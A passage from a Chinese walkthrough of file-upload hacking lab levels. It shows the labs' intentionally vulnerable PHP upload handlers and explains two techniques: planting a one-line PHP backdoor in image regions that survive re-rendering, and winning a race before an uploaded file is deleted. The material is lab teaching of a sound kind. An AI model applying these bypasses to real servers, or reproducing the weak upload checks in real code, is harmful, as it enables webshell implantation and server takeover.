class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">isImage</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"文件未知，上传失败！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传出错！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>跟之前 13，14 步骤一样</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697688064935-56074495-c339-4d5a-9ea8-ea75c0efdd4c.png\" alt=\"img\"></p>\n<h4 id=\"第十六关-绕过图片二次渲染上传\"><a class=\"markdownIt-Anchor\" href=\"#第十六关-绕过图片二次渲染上传\">#</a> <span class=\"label warning\">第十六关 绕过图片二次渲染上传</span></h4>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$filetype</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$tmpname</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$target_path</span><span class=\"token operator\">=</span><span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 获得上传文件的扩展名</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$fileext</span><span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrchr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// 判断文件后缀与类型，合法才进行上传操作</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$filetype</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpname</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token comment\">// 使用上传的图片生成新的图片</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatefromjpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"该文件不是jpg格式的图片！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token comment\">// 给新图片指定文件名</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token variable\">$newfilename</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".jpg\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token comment\">// 显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$newfilename</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token function\">imagejpeg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传出错！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$filetype</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"image/png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpname</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            <span class=\"token comment\">// 使用上传的图片生成新的图片</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatefrompng</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"该文件不是png格式的图片！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                 <span class=\"token comment\">// 给新图片指定文件名</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token variable\">$newfilename</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".png\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>                <span class=\"token comment\">// 显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$newfilename</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>                <span class=\"token function\">imagepng</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>               </pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传出错！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fileext</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$filetype</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"image/gif\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$tmpname</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token comment\">// 使用上传的图片生成新的图片</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token variable\">$im</span> <span class=\"token operator\">=</span> <span class=\"token function\">imagecreatefromgif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"该文件不是gif格式的图片！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                <span class=\"token comment\">// 给新图片指定文件名</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token variable\">$newfilename</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>                <span class=\"token comment\">// 显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>                <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$newfilename</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>                <span class=\"token function\">imagegif</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$im</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$img_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>                @<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>            <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"上传出错！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许上传后缀为.jpg|.png|.gif的图片文件！\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>只允许上传 JPG PNG gif 在源码中使用 imagecreatefromgif 函数对图片进行二次生成。生成的图片保存在，upload 目录下。</p>\n<p>二次渲染将图片马里面的 php 代码删了。接下来把原图和修改后的图片进行比较，看哪里没有被渲染，在这里插入 php 代码。</p>\n<p>制作图片马</p>\n<p>将原图片上传，下载渲染后的图片进行对比，找相同处，覆盖字符串，填写一句话后门，或者恶意指令。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697701386492-9f4896bb-a720-449b-b503-6fdc784bdd17.png\" alt=\"img\"></p>\n<p>找到相同的地方在这个地方写一句话就可以了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697701471530-e0e8e2bb-947e-4e85-9a0c-898ace0ddd72.png\" alt=\"img\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1697701607285-f8015779-a93e-406d-80f1-48dc9097f963.png\" alt=\"img\"></p>\n<h4 id=\"第十七关-条件竞争\"><a class=\"markdownIt-Anchor\" href=\"#第十七关-条件竞争\">#</a> <span class=\"label warning\">第十七关 条件竞争</span></h4>\n<p>如果上传的符合它的白名单，那就进行重命名，如果不符合，直接删除</p>\n<p>在它删除之前就访问这个文件，他就不会删除了。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$is_upload</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$ext_arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$file_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$temp_file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'upload_file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$file_ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span><span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_name</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$upload_file</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$file_name</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp_file</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$upload_file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_ext</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$ext_arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>             <span class=\"token variable\">$img_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">UPLOAD_PATH</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'/'</span><span class=\"token operator\">.</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"YmdHis\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">.</span><span class=\"token 